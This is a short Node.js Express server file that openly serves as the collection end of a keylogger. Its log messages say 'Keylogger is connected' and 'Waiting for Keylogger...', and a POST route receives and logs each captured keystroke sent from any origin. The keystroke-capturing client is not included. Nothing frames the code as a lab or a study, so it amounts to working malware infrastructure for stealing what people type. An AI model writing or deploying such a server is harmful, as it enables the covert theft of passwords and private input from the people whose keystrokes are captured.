const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.get('/', (req, res) => {
  console.log('Keylogger is connected');
  res.status(200).send('Connection successful');
});
app.post('/', (req, res) => {
  const { key } = req.body;
  console.log('Received key:', key);
  res.status(200).send('Key received by the server');
});
const PORT = 5000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log("Waiting for Keylogger...")
});
